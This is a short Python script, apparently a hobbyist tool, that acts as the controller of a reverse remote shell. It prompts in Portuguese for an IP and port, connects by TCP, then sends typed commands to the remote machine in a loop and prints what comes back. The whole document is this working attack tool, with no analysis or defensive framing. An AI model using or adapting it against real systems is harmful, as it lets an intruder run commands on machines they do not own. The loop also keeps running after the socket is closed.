import socket
import os
import sys

print("""
 _________________________________________
|                                         |
|                                         |
|      SHELL REVERSE REMOTE CONTROL       |
|            By: SSH Matheww              |
|                                         |
|_________________________________________|
""")


HOST = str(input('Digite o IP: '))
PORT = int(input('Digite a Porta:'))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
while True:
       command = str(input(f'[{HOST}]> '))
       if command.strip() == 'clear':   
              os.system('cls')
       if command == '':
              s.send('.'.encode())
       if command == 'close connection':
              s.send('close'.encode())
              s.close()
       else:
              s.send(command.encode())
              response = s.recv(50000)
              print(response.decode())